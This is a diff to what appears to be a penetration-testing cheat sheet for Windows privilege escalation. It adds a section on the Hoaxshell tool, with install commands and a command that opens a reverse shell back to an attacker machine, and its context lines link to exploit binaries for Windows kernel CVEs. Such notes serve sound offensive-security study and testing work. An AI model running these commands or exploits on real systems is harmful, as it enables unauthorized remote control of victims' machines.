@@ -392,6 +392,21 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 - https://github.com/sickn3ss/exploits/tree/master/CVE-2021-1732/CVE-2021-1732_20H2/x64/Release
 - https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release
 
+## Hoaxshell
+-> Installation 
+```bash
+git clone https://github.com/t3l3machus/hoaxshell
+cd ./hoaxshell
+sudo pip3 install -r requirements.txt
+chmod +x hoaxshell.py
+```
+
+-> Privilege escalation + Reverse shell
+```bash
+hoaxshell -s <kali-ip> -p <port>
+```
+- https://github.com/t3l3machus/hoaxshell
+
 ## Windows Enumeration Tools
 -> PowerUp.ps1  
 ```powershell
